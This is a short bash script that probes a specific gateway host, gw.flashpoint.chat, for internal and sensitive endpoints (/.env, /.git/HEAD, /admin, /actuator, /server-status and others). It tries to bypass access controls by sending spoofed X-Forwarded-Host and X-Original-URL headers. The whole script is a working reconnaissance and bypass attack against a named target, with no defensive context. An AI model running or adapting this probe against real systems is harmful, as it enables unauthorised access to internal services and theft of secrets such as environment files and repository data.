#!/bin/bash
paths="/ /health /actuator/health /metrics /env /debug /admin /console /api /api/v1 /api/v2 /swagger /swagger.json /.git/HEAD /.env /config /internal /server-status /server-info"
for path in $paths; do
    echo "=== $path ==="
    curl -s -H "X-Forwarded-Host: internal" -H "X-Original-URL: $path" "https://gw.flashpoint.chat/" --max-time 10 -w "\nHTTP %{http_code} %{size_download}\n"
done